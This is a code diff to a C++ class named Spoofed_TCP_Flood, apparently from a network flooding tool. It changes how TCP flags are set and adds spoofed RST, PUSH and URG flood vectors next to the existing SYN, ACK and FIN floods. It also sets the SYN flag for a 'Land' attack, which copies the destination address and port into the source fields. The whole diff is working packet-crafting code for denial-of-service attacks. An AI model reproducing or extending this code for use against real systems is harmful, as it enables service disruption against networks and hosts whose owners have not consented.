@@ -85,15 +85,25 @@ Spoofed_TCP_Flood::Spoofed_TCP_Flood(const config *conf, Logger *logger) : Spoof
 void Spoofed_TCP_Flood::override_headers(tcphdr *tcp, iphdr *ip){
     switch (conf->vector){
         case config::SpoofedSyn:
-            tcp->syn = 1;
+            tcp->th_flags = TH_SYN;
             break;
         case config::SpoofedAck:
-            tcp->ack = 1;
+            tcp->th_flags = TH_ACK;
+            break;
+        case config::SpoofedRST:
+            tcp->th_flags = TH_RST;
+            break;
+        case config::SpoofedPUSH:
+            tcp->th_flags = TH_PUSH;
+            break;
+        case config::SpoofedURG:
+            tcp->th_flags = TH_URG;
             break;
         case config::SpoofedFin:
-            tcp->fin = 1;
+            tcp->th_flags = TH_FIN;
             break;
         case config::Land:
+            tcp->th_flags = TH_SYN;
             ip->saddr = ip->daddr;
             tcp->source = tcp->dest;
         default:break;
@@ -119,15 +129,8 @@ void Spoofed_TCP_Flood::init_headers(iphdr *ip, tcphdr *tcp, char *buf) {
     tcp->source = htons(static_cast<uint16_t>(s_port));
     tcp->dest = htons(static_cast<uint16_t>(strtol(conf->port.c_str(), nullptr, 10)));
     tcp->seq = 0;
-    tcp->ack_seq = 0;
     tcp->doff = 5;  //tcp header size
-    tcp->fin=0;
-    tcp->syn=0;
-    tcp->rst=0;
-    tcp->psh=0;
-    tcp->ack=0;
-    tcp->urg=0;
     tcp->window = htons (5840);
     tcp->check = 0;
-    tcp->urg_ptr = 0;
+    tcp->th_flags = 0;
 }
